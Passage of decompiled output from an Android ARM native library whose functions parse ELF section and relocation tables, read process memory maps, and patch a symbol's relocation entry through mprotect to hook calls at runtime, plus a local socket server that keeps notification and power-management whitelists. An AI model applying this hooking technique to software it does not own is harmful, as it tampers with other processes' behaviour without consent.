  __android_log_print(3,DAT_00012374 + 0x1232e,DAT_00012378 + 0x12330,uVar3);
  strcpy((char *)(iVar2 + 0x1232c),param_1);
  pthread_create(&pStack_1c,(pthread_attr_t *)0x0,*(__start_routine **)(DAT_0001237c + 0x12348),
                 (char *)(iVar2 + 0x1232c));
  return ZEXT48(param_1) << 0x20;
}



/* Function: read_header @ 00012380 */

undefined4 read_header(int param_1,undefined4 *param_2)

{
  void *pvVar1;
  __off_t _Var2;
  undefined4 *puVar3;
  ssize_t sVar4;
  
  pvVar1 = malloc(0x34);
  *param_2 = pvVar1;
  _Var2 = lseek(param_1,0,0);
  if (_Var2 < 0) {
    free((void *)*param_2);
    puVar3 = (undefined4 *)__errno();
    return *puVar3;
  }
  sVar4 = read(param_1,(void *)*param_2,0x34);
  if (sVar4 < 1) {
    free((void *)*param_2);
    puVar3 = (undefined4 *)__errno();
    *puVar3 = 0x16;
    return 0x16;
  }
  return 0;
}



/* Function: read_section_table @ 000123ce */

undefined4 read_section_table(int param_1,int param_2,undefined4 *param_3)

{
  void *pvVar1;
  __off_t _Var2;
  undefined4 *puVar3;
  ssize_t sVar4;
  size_t __size;
  
  if (param_2 == 0) {
    return 0x16;
  }
  __size = (uint)*(ushort *)(param_2 + 0x30) * 0x28;
  pvVar1 = malloc(__size);
  *param_3 = pvVar1;
  _Var2 = lseek(param_1,*(__off_t *)(param_2 + 0x20),0);
  if (_Var2 < 0) {
    free((void *)*param_3);
    puVar3 = (undefined4 *)__errno();
    return *puVar3;
  }
  sVar4 = read(param_1,(void *)*param_3,__size);
  if (sVar4 < 1) {
    free((void *)*param_3);
    puVar3 = (undefined4 *)__errno();
    *puVar3 = 0x16;
    return 0x16;
  }
  return 0;
}



/* Function: read_relocation_table @ 0001242a */

undefined4 read_relocation_table(int param_1,int param_2,undefined4 *param_3)

{
  void *pvVar1;
  __off_t _Var2;
  undefined4 *puVar3;
  ssize_t sVar4;
  
  if (param_2 == 0) {
    return 0x16;
  }
  pvVar1 = malloc(*(size_t *)(param_2 + 0x14));
  *param_3 = pvVar1;
  _Var2 = lseek(param_1,*(__off_t *)(param_2 + 0x10),0);
  if (_Var2 < 0) {
    free((void *)*param_3);
    puVar3 = (undefined4 *)__errno();
    return *puVar3;
  }
  sVar4 = read(param_1,(void *)*param_3,*(size_t *)(param_2 + 0x14));
  if (sVar4 < 1) {
    free((void *)*param_3);
    puVar3 = (undefined4 *)__errno();
    *puVar3 = 0x16;
    return 0x16;
  }
  return 0;
}



/* Function: section_by_index @ 00012480 */

undefined8 section_by_index(undefined4 param_1,uint param_2,undefined4 *param_3)

{
  void *__ptr;
  int iVar1;
  undefined4 uVar2;
  void *__dest;
  undefined4 *puVar3;
  void *local_20;
  void *local_1c;
  undefined4 *puStack_18;
  
  *param_3 = 0;
  local_20 = (void *)0x0;
  local_1c = (void *)0x0;
  puStack_18 = param_3;
  iVar1 = read_header(param_1,&local_20);
  if ((iVar1 == 0) &&
     (iVar1 = read_section_table(param_1,local_20,&local_1c), __ptr = local_20, iVar1 == 0)) {
    uVar2 = 0x16;
    if (*(ushort *)((int)local_20 + 0x30) <= param_2) goto LAB_000124e8;
    __dest = malloc(0x28);
    *param_3 = __dest;
    if (__dest != (void *)0x0) {
      memcpy(__dest,(void *)(param_2 * 0x28 + (int)local_1c),0x28);
      free(__ptr);
      free(local_1c);
      uVar2 = 0;
      goto LAB_000124e8;
    }
    free(__ptr);
    free(local_1c);
  }
  puVar3 = (undefined4 *)__errno();
  uVar2 = *puVar3;
LAB_000124e8:
  return CONCAT44(local_20,uVar2);
}



/* Function: section_by_type @ 000124ec */

undefined8 section_by_type(void *param_1,void *param_2,undefined4 *param_3)

{
  void *__ptr;
  int iVar1;
  void *__dest;
  undefined4 *puVar2;
  uint uVar3;
  undefined4 uVar4;
  void *__src;
  void *local_20;
  void *local_1c;
  undefined4 *puStack_18;
  
  local_20 = param_1;
  local_1c = param_2;
  puStack_18 = param_3;
  __android_log_print(3,DAT_00012574 + 0x124fc,DAT_00012578 + 0x12500,param_2);
  *param_3 = 0;
  local_20 = (void *)0x0;
  local_1c = (void *)0x0;
  iVar1 = read_header(param_1,&local_20);
  if ((iVar1 == 0) &&
     (iVar1 = read_section_table(param_1,local_20,&local_1c), __ptr = local_20, iVar1 == 0)) {
    __src = local_1c;
    for (uVar3 = 0; uVar3 < *(ushort *)((int)local_20 + 0x30); uVar3 = uVar3 + 1) {
      if (param_2 == *(void **)((int)__src + 4)) {
        __dest = malloc(0x28);
        *param_3 = __dest;
        if (__dest == (void *)0x0) {
          free(__ptr);
          free(local_1c);
          goto LAB_0001254c;
        }
        memcpy(__dest,__src,0x28);
        break;
      }
      __src = (void *)((int)__src + 0x28);
    }
    free(__ptr);
    free(local_1c);
    uVar4 = 0;
  }
  else {
LAB_0001254c:
    puVar2 = (undefined4 *)__errno();
    uVar4 = *puVar2;
  }
  return CONCAT44(local_20,uVar4);
}



/* Function: section_by_name @ 0001257c */

undefined4 section_by_name(undefined4 param_1,char *param_2,undefined4 *param_3)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  void *__dest;
  undefined4 *puVar5;
  undefined4 uVar6;
  int iVar7;
  uint uVar8;
  void *__src;
  void *local_2c;
  void *local_28;
  void *local_24;
  
  iVar7 = DAT_00012680 + 0x1258e;
  __android_log_print(3,iVar7,DAT_00012684 + 0x12594,param_2);
  *param_3 = 0;
  local_2c = (void *)0x0;
  local_28 = (void *)0x0;
  local_24 = (void *)0x0;
  iVar3 = read_header(param_1,&local_2c);
  if (((iVar3 == 0) && (iVar3 = read_section_table(param_1,local_2c,&local_28), iVar3 == 0)) &&
     (iVar4 = read_relocation_table
                        (param_1,(void *)((uint)*(ushort *)((int)local_2c + 0x32) * 0x28 +
                                         (int)local_28),&local_24), iVar2 = DAT_00012690,
     iVar3 = DAT_0001268c, iVar4 == 0)) {
    __android_log_print(3,iVar7,DAT_00012688 + 0x125ee,*(undefined2 *)((int)local_2c + 0x30));
    iVar7 = 0;
    for (uVar8 = 0; uVar8 < *(ushort *)((int)local_2c + 0x30); uVar8 = uVar8 + 1) {
      __android_log_print(3,iVar2 + 0x125f6,iVar3 + 0x12600,uVar8,
                          (int)local_24 + *(int *)((int)local_28 + iVar7));
      __src = (void *)((int)local_28 + iVar7);
      piVar1 = (int *)((int)local_28 + iVar7);
      iVar7 = iVar7 + 0x28;
      iVar4 = strcmp(param_2,(char *)((int)local_24 + *piVar1));
      if (iVar4 == 0) {
        __dest = malloc(0x28);
        *param_3 = __dest;
        if (__dest == (void *)0x0) {
          free(local_2c);
          free(local_28);
          free(local_24);
          goto LAB_00012642;
        }
        memcpy(__dest,__src,0x28);
        break;
      }
    }
    if (local_2c != (void *)0x0) {
      free(local_2c);
    }
    if (local_28 != (void *)0x0) {
      free(local_28);
    }
    uVar6 = 0;
    if (local_24 != (void *)0x0) {
      free(local_24);
      uVar6 = 0;
    }
  }
  else {
LAB_00012642:
    puVar5 = (undefined4 *)__errno();
    uVar6 = *puVar5;
  }
  return uVar6;
}



/* Function: symbol_by_name @ 00012694 */

undefined4
symbol_by_name(undefined4 param_1,int param_2,char *param_3,undefined4 *param_4,uint *param_5)

{
  int iVar1;
  void *__dest;
  undefined4 *puVar2;
  undefined4 uVar3;
  uint uVar4;
  uint uVar5;
  void *__src;
  void *local_2c;
  void *local_28;
  void *local_24 [2];
  
  __android_log_print(3,DAT_00012758 + 0x126b0,DAT_0001275c + 0x126b4,param_3);
  *param_4 = 0;
  *param_5 = 0;
  local_2c = (void *)0x0;
  local_28 = (void *)0x0;
  local_24[0] = (void *)0x0;
  iVar1 = section_by_index(param_1,*(undefined4 *)(param_2 + 0x18),&local_2c);
  if (((iVar1 == 0) && (iVar1 = read_relocation_table(param_1,local_2c,&local_28), iVar1 == 0)) &&
     (iVar1 = read_relocation_table(param_1,param_2,local_24), iVar1 == 0)) {
    uVar4 = *(uint *)(param_2 + 0x14);
    for (uVar5 = 0; uVar5 != uVar4 >> 4; uVar5 = uVar5 + 1) {
      __src = (void *)((int)local_24[0] + uVar5 * 0x10);
      iVar1 = strcmp(param_3,(char *)((int)local_28 + *(int *)((int)local_24[0] + uVar5 * 0x10)));
      if (iVar1 == 0) {
        __dest = malloc(0x10);
        *param_4 = __dest;
        if (__dest == (void *)0x0) {
          free(local_2c);
          free(local_28);
          free(local_24[0]);
          goto LAB_00012722;
        }
        memcpy(__dest,__src,0x10);
        *param_5 = uVar5;
        break;
      }
    }
    free(local_2c);
    free(local_28);
    free(local_24[0]);
    uVar3 = 0;
  }
  else {
LAB_00012722:
    puVar2 = (undefined4 *)__errno();
    uVar3 = *puVar2;
  }
  return uVar3;
}



/* Function: elf_hook @ 00012760 */

undefined4 elf_hook(char *param_1,int param_2,int param_3,int param_4)

{
  long lVar1;
  int iVar2;
  int iVar3;
  undefined4 uVar4;
  uint uVar5;
  size_t __len;
  int extraout_r3;
  undefined4 uVar6;
  uint uVar7;
  int *piVar8;
  void *local_34;
  void *local_30;
  void *local_2c;
  void *local_28;
  uint local_24 [2];
  
  local_34 = (void *)0x0;
  local_30 = (void *)0x0;
  local_2c = (void *)0x0;
  local_28 = (void *)0x0;
  if ((param_3 != 0 && param_2 != 0) && (param_4 != 0)) {
    piVar8 = (int *)(DAT_000128a8 + 0x1279e);
    if (*piVar8 == 0) {
      lVar1 = sysconf(0x27);
      *piVar8 = lVar1;
    }
    iVar2 = open(param_1,0);
    if (-1 < iVar2) {
      iVar3 = section_by_type(iVar2,0xb,&local_34);
      if ((((iVar3 == 0) &&
           (iVar3 = symbol_by_name(iVar2,local_34,param_3,&local_28,local_24), iVar3 == 0)) &&
          (iVar3 = section_by_name(iVar2,DAT_000128ac + 0x127e0,&local_30), iVar3 == 0)) &&
         (iVar3 = section_by_name(iVar2,DAT_000128b0 + 0x127ee,&local_2c), iVar3 == 0)) {
        __android_log_print(3,DAT_000128bc + 0x1282c,DAT_000128c0 + 0x1282e);
        free(local_34);
        free(local_28);
        uVar5 = *(uint *)((int)local_30 + 0x14);
        iVar3 = *(int *)((int)local_30 + 0xc);
        free(local_30);
        close(iVar2);
        piVar8 = (int *)(param_2 + iVar3);
        for (uVar7 = 0; uVar7 != uVar5 >> 3; uVar7 = uVar7 + 1) {
          if (local_24[0] == (uint)piVar8[1] >> 8) {
            iVar2 = *piVar8;
            __len = *(size_t *)(DAT_000128c8 + 0x12878);
            *(int *)(DAT_000128c4 + 0x12876) = param_2 + iVar2;
            uVar6 = *(undefined4 *)(param_2 + *piVar8);
            iVar3 = mprotect((void *)(-__len & param_2 + iVar2),__len,7);
            uVar4 = 0;
            iVar2 = extraout_r3;
            if (iVar3 != -1) {
              iVar2 = *piVar8;
              uVar4 = uVar6;
            }
            if (iVar3 == -1) {
              return 0;
            }
            *(int *)(param_2 + iVar2) = param_4;
            return uVar4;
          }
          piVar8 = piVar8 + 2;
        }
      }
      else {
        __android_log_print(3,DAT_000128b4 + 0x127fe,DAT_000128b8 + 0x12800);
        free(local_34);
        free(local_30);
        free(local_2c);
        free(local_28);
        close(iVar2);
      }
    }
  }
  return 0;
}



/* Function: insert_data_notification @ 000128cc */

undefined4 insert_data_notification(uint param_1)

{
  uint uVar1;
  
  uVar1 = DAT_000128e8 & param_1;
  if ((int)uVar1 < 0) {
    uVar1 = (uVar1 - 1 | 0xffffff00) + 1;
  }
  *(uint *)(DAT_000128ec + 0x128d8 + uVar1 * 4) = param_1;
  return 0;
}



/* Function: is_whitelist_notification @ 000128f0 */

bool is_whitelist_notification(uint param_1)

{
  uint uVar1;
  
  uVar1 = DAT_00012914 & param_1;
  if ((int)uVar1 < 0) {
    uVar1 = (uVar1 - 1 | 0xffffff00) + 1;
  }
  return *(uint *)(DAT_00012918 + 0x128fc + uVar1 * 4) == param_1;
}



/* Function: insert_data_powercenter @ 0001291c */

undefined4 insert_data_powercenter(uint param_1)

{
  uint uVar1;
  
  __android_log_print(6,DAT_00012950 + 0x1292a,DAT_00012954 + 0x12926);
  uVar1 = DAT_0001294c & param_1;
  if ((int)uVar1 < 0) {
    uVar1 = (uVar1 - 1 | 0xffffff00) + 1;
  }
  *(uint *)(DAT_00012958 + 0x1293a + uVar1 * 4) = param_1;
  return 0;
}



/* Function: is_whitelist_powercenter @ 0001295c */

bool is_whitelist_powercenter(uint param_1)

{
  uint uVar1;
  int iVar2;
  
  uVar1 = DAT_0001299c & param_1;
  if ((int)uVar1 < 0) {
    uVar1 = (uVar1 - 1 | 0xffffff00) + 1;
  }
  iVar2 = DAT_000129a0 + 0x1297a;
  __android_log_print(6,DAT_000129a4 + 0x12984,DAT_000129a8 + 0x12986,param_1,uVar1,
                      *(undefined4 *)(iVar2 + uVar1 * 4));
  return *(uint *)(iVar2 + uVar1 * 4) == param_1;
}



/* Function: makeAddr @ 000129ac */

undefined4 makeAddr(char *param_1,undefined2 *param_2,int *param_3)

{
  size_t sVar1;
  
  sVar1 = strlen(param_1);
  if ((int)sVar1 < 0x6b) {
    *(undefined1 *)(param_2 + 1) = 0;
    strcpy((char *)((int)param_2 + 3),param_1);
    *param_2 = 1;
    *param_3 = sVar1 + 3;
    return 0;
  }
  return 0xffffffff;
}



/* Function: is_block @ 000129e4 */

void is_block(int param_1,undefined4 param_2,void *param_3,size_t param_4)

{
  int iVar1;
  undefined4 *__s;
  int iVar2;
  ssize_t sVar3;
  uint *puVar4;
  size_t __n;
  uint uVar5;
  int iVar6;
  int *piVar7;
  int local_1a4;
  socklen_t local_1a0;
  sockaddr asStack_19c [7];
  undefined4 local_12c;
  int local_128;
  int local_124;
  uint auStack_120 [61];
  int local_2c;
  
  piVar7 = *(int **)(DAT_00012c28 + 0x129f8);
  local_2c = *piVar7;
  memset(&local_12c,0,0x100);
  iVar1 = makeAddr(DAT_00012c2c + 0x12a18,asStack_19c,&local_1a0);
  if (-1 < iVar1) {
    iVar1 = socket(1,1,1);
    if (-1 < iVar1) {
      iVar6 = DAT_00012c38 + 0x12a4c;
      __s = malloc(param_4 + 0x10);
      memset(__s,0,param_4 + 0x10);
      __android_log_print(6,iVar6,DAT_00012c3c + 0x12a64,param_1);
      iVar2 = connect(iVar1,asStack_19c,local_1a0);
      if (iVar2 < 0) {
        iVar2 = DAT_00012c40 + 0x12a80;
LAB_00012b78:
        __android_log_print(6,iVar6,iVar2);
        local_12c = 0;
      }
      else {
        local_1a4 = 1;
        *__s = param_2;
        if (param_1 != 10) {
          if ((((param_1 == 0x16 || param_1 == 0x14) || (param_1 == 0x19 || param_1 == 0x18)) ||
              (param_1 == 0x25 || param_1 == 0x1a)) || (param_1 == 0x15)) {
            local_1a4 = 5;
          }
          else if ((param_1 == 0x24 || param_1 == 0x26) || (param_1 == 0x2a)) {
            local_1a4 = 0x30;
          }
          else if (param_1 == 0x21 || param_1 == 0x1b) {
            local_1a4 = 0xc;
          }
          else if (param_1 == 0x2f || param_1 == 0x1c) {
            local_1a4 = 7;
          }
          else {
            local_1a4 = 3;
            if (((param_1 != 0x1e) && (local_1a4 = 4, param_1 != 0x1f)) &&
               ((local_1a4 = 9, param_1 != 0x20 && (local_1a4 = param_1, param_1 == 0x2b)))) {
              local_1a4 = 8;
            }
          }
        }
        __s[1] = local_1a4;
        __n = 8;
        if (0 < (int)param_4 || param_3 != (void *)0x0) {
          memcpy(__s + 2,param_3,param_4);
          __n = param_4 + 8;
        }
        sVar3 = write(iVar1,__s,__n);
        if (sVar3 < 0) {
          iVar6 = DAT_00012c44 + 0x12b76;
          iVar2 = DAT_00012c48 + 0x12b78;
          goto LAB_00012b78;
        }
        sVar3 = read(iVar1,&local_12c,0x100);
        if (sVar3 < 0) {
          iVar6 = DAT_00012c4c + 0x12b9a;
          iVar2 = DAT_00012c50 + 0x12b9c;
          goto LAB_00012b78;
        }
        iVar2 = DAT_00012c54 + 0x12ba6;
        __android_log_print(6,iVar2,DAT_00012c58 + 0x12bac,local_12c);
        if ((4 < sVar3) &&
           (__android_log_print(6,iVar2,DAT_00012c5c + 0x12bc0,local_128), local_128 != 0)) {
          memset((void *)(DAT_00012c60 + 0x12bd2),0,0x404);
          iVar6 = DAT_00012c64 + 0x12be0;
          puVar4 = auStack_120;
          for (iVar2 = 0; iVar2 < local_124; iVar2 = iVar2 + 1) {
            uVar5 = DAT_00012c24 & *puVar4;
            if ((int)uVar5 < 0) {
              uVar5 = (uVar5 - 1 | 0xffffff00) + 1;
            }
            *(uint *)(iVar6 + uVar5 * 4) = *puVar4;
            puVar4 = puVar4 + 1;
          }
        }
      }
      close(iVar1);
      free(__s);
      goto LAB_00012c0e;
    }
    __android_log_print(6,DAT_00012c30 + 0x12a3a,DAT_00012c34 + 0x12a3c);
  }
  local_12c = 0;
LAB_00012c0e:
  if (local_2c != *piVar7) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(local_12c);
  }
  return;
}



/* Function: create_server @ 00012c68 */

void create_server(undefined4 param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  ssize_t sVar7;
  uint uVar8;
  int iVar9;
  uint uVar10;
  int iVar11;
  int iVar12;
  int *piVar13;
  int iVar14;
  undefined4 *puVar15;
  bool bVar16;
  socklen_t local_4a0;
  sockaddr asStack_49c [7];
  int local_42c;
  int local_428;
  uint local_424;
  undefined4 auStack_420 [253];
  int local_2c;
  
  iVar11 = DAT_00012f18 + 0x12c7c;
  piVar13 = *(int **)(iVar11 + DAT_00012f1c);
  iVar12 = DAT_00012f20 + 0x12c84;
  local_2c = *piVar13;
  __android_log_print(6,iVar12,DAT_00012f24 + 0x12c86,param_1);
  iVar4 = makeAddr(param_1,asStack_49c,&local_4a0);
  if (-1 < iVar4) {
    iVar4 = socket(1,1,1);
    if (iVar4 < 0) {
      __android_log_print(6,iVar12,DAT_00012f28 + 0x12cc0);
    }
    else {
      iVar5 = bind(iVar4,asStack_49c,local_4a0);
      if (iVar5 < 0) {
        iVar11 = DAT_00012f2c + 0x12cd6;
      }
      else {
        iVar6 = listen(iVar4,1);
        iVar1 = DAT_00012f40;
        iVar5 = DAT_00012f3c;
        if (-1 < iVar6) {
          piVar13 = (int *)(DAT_00012f34 + 0x12d02);
          iVar12 = DAT_00012f38 + 0x12d06;
          do {
            do {
              while (iVar6 = accept(iVar4,(sockaddr *)0x0,(socklen_t *)0x0), iVar6 < 0) {
                __android_log_print(6,DAT_00012f44 + 0x12d22,DAT_00012f48 + 0x12d24);
              }
              sVar7 = read(iVar6,&local_42c,0x400);
              iVar3 = local_428;
              iVar2 = DAT_00012f68;
              iVar9 = DAT_00012f54;
              uVar10 = DAT_00012f14;
            } while (sVar7 < 0);
            if (sVar7 < 5) {
              if ((sVar7 == 0) && (*piVar13 != 0)) {
                puVar15 = *(undefined4 **)(iVar11 + DAT_00012f68);
                iVar9 = *(int *)(iVar11 + DAT_00012f74);
                if (*(int *)*puVar15 == iVar9) {
                  __android_log_print(6,iVar1 + 0x12eda,DAT_00012fb0 + 0x12edc);
                }
                else {
                  __android_log_print(6,iVar5 + 0x12eea,iVar12);
                  *(int *)*puVar15 = iVar9;
                }
              }
            }
            else {
              bVar16 = sVar7 != 0xc;
              if (local_42c != 1 || bVar16) {
                if (local_42c != 0 || bVar16) {
                  if (local_42c != 2 || bVar16) {
                    if (local_42c == 10) {
                      __android_log_print(6,DAT_00012f9c + 0x12e6e,DAT_00012fa0 + 0x12e70);
                      **(int **)(iVar11 + DAT_00012fa4) = local_428;
                      if (local_428 == 0) {
                        memset((void *)(DAT_00012fa8 + 0x12e86),0,0x404);
                      }
                      else if (local_428 == 1) {
                        memset((void *)(DAT_00012fac + 0x12e9e),0,0x404);
                        uVar10 = local_424;
                        puVar15 = auStack_420;
                        for (iVar9 = 0; iVar9 < (int)uVar10; iVar9 = iVar9 + 1) {
                          insert_data_powercenter(*puVar15);
                          puVar15 = puVar15 + 1;
                        }
                      }
                    }
                  }
                  else {
                    __android_log_print(6,DAT_00012f8c + 0x12e24,DAT_00012f90 + 0x12e28);
                    uVar10 = local_424 & uVar10;
                    if (local_428 == 1) {
                      iVar9 = DAT_00012f94 + 0x12e3e;
                      uVar8 = local_424;
                      if ((int)uVar10 < 0) {
                        uVar10 = (uVar10 - 1 | 0xffffff00) + 1;
                      }
                    }
                    else {
                      iVar9 = DAT_00012f98 + 0x12e50;
                      if ((int)uVar10 < 0) {
                        uVar10 = (uVar10 - 1 | 0xffffff00) + 1;
                      }
                      uVar8 = 0;
                    }
                    *(uint *)(iVar9 + uVar10 * 4) = uVar8;
                  }
                  goto LAB_00012ef2;
                }
                iVar14 = DAT_00012f60 + 0x12d9a;
                __android_log_print(6,iVar14,DAT_00012f64 + 0x12da2,local_428);
                puVar15 = *(undefined4 **)(iVar11 + iVar2);
                if (iVar3 == 0) {
                  iVar9 = DAT_00012f80 + 0x12dea;
                  *(undefined4 *)(DAT_00012f7c + 0x12de8) = 0;
                  __android_log_print(6,iVar14,iVar9);
                  iVar9 = DAT_00012f88 + 0x12dfe;
                  *(undefined4 *)*puVar15 = *(undefined4 *)(iVar11 + DAT_00012f84);
                }
                else {
                  *(undefined4 *)(DAT_00012f6c + 0x12dc0) = 1;
                  __android_log_print(6,iVar14,DAT_00012f70 + 0x12dc8);
                  iVar9 = DAT_00012f78 + 0x12dd8;
                  *(undefined4 *)*puVar15 = *(undefined4 *)(iVar11 + DAT_00012f74);
                }
                uVar10 = *(uint *)*puVar15;
              }
              else {
                iVar14 = DAT_00012f50 + 0x12d64;
                **(int **)(iVar11 + DAT_00012f4c) = local_428;
                __android_log_print(6,iVar14,iVar9 + 0x12d6c);
                **(uint **)(iVar11 + DAT_00012f58) = local_424;
                iVar9 = DAT_00012f5c + 0x12d80;
                uVar10 = local_424;
              }
              __android_log_print(6,iVar14,iVar9,uVar10);
            }
LAB_00012ef2:
            close(iVar6);
          } while( true );
        }
        iVar11 = DAT_00012f30 + 0x12ce8;
      }
      __android_log_print(6,iVar12,iVar11);
      close(iVar4);
    }
  }
  if (local_2c == *piVar13) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail(1);
}



/* Function: insert_data @ 00012fb4 */

undefined4 insert_data(uint param_1)

{
  uint uVar1;
  
  uVar1 = DAT_00012fd0 & param_1;
  if ((int)uVar1 < 0) {
    uVar1 = (uVar1 - 1 | 0xffffff00) + 1;
  }
  *(uint *)(DAT_00012fd4 + 0x12fc0 + uVar1 * 4) = param_1;
  return 0;
}



/* Function: init_whitelist @ 00012fd8 */

void init_whitelist(void)

{
  int iVar1;
  FILE *__stream;
  char *pcVar2;
  undefined4 uVar3;
  uint uVar4;
  char *__format;
  int *piVar5;
  uint local_2c;
  char acStack_28 [12];
  int local_1c;
  
  piVar5 = *(int **)(DAT_00013068 + 0x12fe4);
  local_1c = *piVar5;
  __stream = fopen((char *)(DAT_0001306c + 0x12fea),(char *)(DAT_00013070 + 0x12fee));
  iVar1 = DAT_00013080;
  if (__stream == (FILE *)0x0) {
    __android_log_print(6,DAT_00013074 + 0x13000,DAT_00013078 + 0x13002);
    uVar3 = 0;
  }
  else {
    __format = (char *)(DAT_0001307c + 0x13014);
    fseek(__stream,0,0);
    while (pcVar2 = fgets(acStack_28,10,__stream), pcVar2 != (char *)0x0) {
      sscanf(acStack_28,__format,&local_2c);
      uVar4 = local_2c & DAT_00013064;
      if ((int)uVar4 < 0) {
        uVar4 = (uVar4 - 1 | 0xffffff00) + 1;
      }
      *(uint *)(iVar1 + 0x1302c + uVar4 * 4) = local_2c;
    }
    fclose(__stream);
    uVar3 = 1;
  }
  if (local_1c != *piVar5) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(uVar3);
  }
  return;
}



/* Function: is_whitelist @ 00013084 */

bool is_whitelist(uint param_1)

{
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  
  iVar1 = DAT_000130c4;
  if (*(int *)("com.android.internal.telephony.ITelephonyRegistry" + DAT_000130c4 + 0x16) == 0) {
    uVar2 = init_whitelist();
    *(undefined4 *)("com.android.internal.telephony.ITelephonyRegistry" + iVar1 + 0x16) = uVar2;
  }
  uVar3 = param_1 & DAT_000130c0;
  if ((int)uVar3 < 0) {
    uVar3 = (uVar3 - 1 | 0xffffff00) + 1;
  }
  return *(uint *)(DAT_000130c8 + 0x130a8 + uVar3 * 4) == param_1;
}



/* Function: get_module_base @ 000130cc */

void get_module_base(int param_1,char *param_2)

{
  FILE *__stream;
  ulong uVar1;
  char *pcVar2;
  int *piVar3;
  char acStack_434 [32];
  char acStack_414 [1024];
  int local_14;
  
  piVar3 = *(int **)(DAT_00013164 + 0x130de);
  local_14 = *piVar3;
  if (param_1 < 0) {
    pcVar2 = (char *)(DAT_00013168 + 0x130ec);
  }
  else {
    pcVar2 = (char *)(DAT_0001316c + 0x130f2);
  }
  snprintf(acStack_434,0x20,pcVar2,param_1);
  __stream = fopen(acStack_434,(char *)(DAT_00013170 + 0x13100));
  if (__stream == (FILE *)0x0) {
    uVar1 = 0;
  }
  else {
    do {
      pcVar2 = fgets(acStack_414,0x400,__stream);
      if (pcVar2 == (char *)0x0) {
        uVar1 = 0;
        goto LAB_00013144;
      }
      pcVar2 = strstr(acStack_414,param_2);
    } while (pcVar2 == (char *)0x0);
    pcVar2 = strtok(acStack_414,(char *)(DAT_00013174 + 0x1311c));
    uVar1 = strtoul(pcVar2,(char **)0x0,0x10);
    if (uVar1 == 0x8000) {
      uVar1 = 0;
    }
LAB_00013144:
    fclose(__stream);
  }
  if (local_14 == *piVar3) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail(uVar1);
}



/* Function: __on_dlclose @ 00013178 */

void __on_dlclose(void)

{
  (*(code *)PTR___cxa_finalize_00014ffc)(DAT_00013184);
  return;
}



/* Function: __aeabi_unwind_cpp_pr0 @ 00016000 */

/* WARNING: Control flow encountered bad instruction data */

void __aeabi_unwind_cpp_pr0(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: Parcel @ 00016004 */

/* WARNING: Control flow encountered bad instruction data */

void __thiscall android::Parcel::Parcel(Parcel *this)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: self @ 00016008 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void android::IPCThreadState::self(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: sendReply @ 0001600c */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void android::IPCThreadState::sendReply(Parcel *param_1,uint param_2)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: ~Parcel @ 00016010 */

/* WARNING: Control flow encountered bad instruction data */

void __thiscall android::Parcel::~Parcel(Parcel *this)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: memset @ 00016014 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * memset(void *__s,int __c,size_t __n)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: __android_log_print @ 00016018 */

/* WARNING: Control flow encountered bad instruction data */

void __android_log_print(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: setData @ 0001601c */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void android::Parcel::setData(uchar *param_1,uint param_2)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: setDataPosition @ 00016020 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void android::Parcel::setDataPosition(uint param_1)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: readInt32 @ 00016024 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void android::Parcel::readInt32(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: readString16 @ 00016028 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void android::Parcel::readString16(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: strcmp @ 0001602c */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int strcmp(char *__s1,char *__s2)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: strstr @ 00016030 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

char * strstr(char *__haystack,char *__needle)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: ~String16 @ 00016034 */

/* WARNING: Control flow encountered bad instruction data */

void __thiscall android::String16::~String16(String16 *this)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: dataPosition @ 00016038 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void android::Parcel::dataPosition(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: memcpy @ 0001603c */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * memcpy(void *__dest,void *__src,size_t __n)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: __stack_chk_fail @ 00016040 */

/* WARNING: Control flow encountered bad instruction data */

void __stack_chk_fail(void)

{
